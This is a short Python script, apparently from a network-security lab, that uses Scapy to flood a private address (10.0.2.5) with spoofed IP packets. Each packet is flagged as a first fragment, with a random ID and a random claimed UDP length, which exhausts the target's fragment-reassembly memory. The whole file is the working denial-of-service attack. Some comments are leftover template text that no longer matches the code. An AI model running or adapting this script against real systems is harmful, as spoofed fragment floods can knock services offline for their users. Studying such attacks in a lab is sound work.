#!/usr/bin/python3
from scapy.all import *
import random
# Construct IP header
while(True):
	ip = IP(src="1.2.3.4", dst="10.0.2.5")
	ip.id = random.randint(1,10000) # Identification
	ip.frag = 0 # Offset of this IP fragment
	ip.flags = 1 # Flags
	# Construct UDP header
	udp = UDP(sport=7070, dport=9090)
	udp.len = random.randint(100,500) # This should be the combined length of all fragments
	# Construct payload
	payload = 'A' * (udp.len-8) # Put 80 bytes in the first fragment
	# Construct the entire packet and send it out
	pkt = ip/udp/payload # For other fragments, we should use ip/payload
	pkt[UDP].checksum = 0 # Set the checksum field to zero
	send(pkt, verbose=0)

